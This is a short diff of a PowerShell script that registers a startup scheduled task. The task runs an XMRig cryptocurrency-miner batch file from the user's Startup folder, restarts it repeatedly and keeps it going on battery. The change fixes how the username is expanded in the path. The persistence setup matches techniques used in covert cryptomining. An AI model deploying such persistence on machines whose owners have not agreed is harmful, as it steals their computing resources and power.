@@ -2,7 +2,7 @@
 Set-Variable -Name Trigger -Value (New-ScheduledTaskTrigger -AtStartup)
 
 # Define the action (execute the batch script for XMRig)
-Set-Variable -Name Action -Value (New-ScheduledTaskAction -Argument "/c C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\xmrig-6.22.2\w.bat" -Execute "cmd.exe")
+Set-Variable -Name Action -Value (New-ScheduledTaskAction -Argument "/c C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\xmrig-6.22.2\w.bat" -Execute "cmd.exe")
 
 # Define the task settings
 Set-Variable -Name Settings -Value (New-ScheduledTaskSettingsSet -StartWhenAvailable -RestartInterval (New-TimeSpan -Minutes 7) -RestartCount 5 -DontStopIfGoingOnBatteries)
